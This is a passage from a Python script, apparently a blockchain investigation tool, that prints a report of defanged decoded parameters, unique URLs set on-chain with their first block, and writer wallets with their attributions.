            v = h.get("decoded_param_defanged") or ""
            p(f"  {t:25} {b:>10}  {f:<18} {v[:48]}\n")
        if len(hist) > 50: p(f"  ... +{len(hist)-50} more\n")
        if report.get("unique_urls_seen"):
            p(f"\n  UNIQUE URLS SET ({len(report['unique_urls_seen'])}):\n")
            for u in report["unique_urls_seen"]:
                p(f"    {u['url_defanged']}  (first set at {u['first_set_time']} / block {u['first_set_block']})\n")
        if report.get("writer_wallets"):
            p(f"\n  WRITER WALLETS:\n")
            for w in report["writer_wallets"]:
                tag = (w["attribution"] or {}).get("name", "(unknown)")
                p(f"    {w['address']}  txs={w['tx_count']}  attribution={tag}\n")
    if report.get("errors"):
        p("\n  [errors]\n")
        for e in report["errors"]: p(f"    - {e}\n")
    p("\n")


if __name__ == "__main__":
    main()
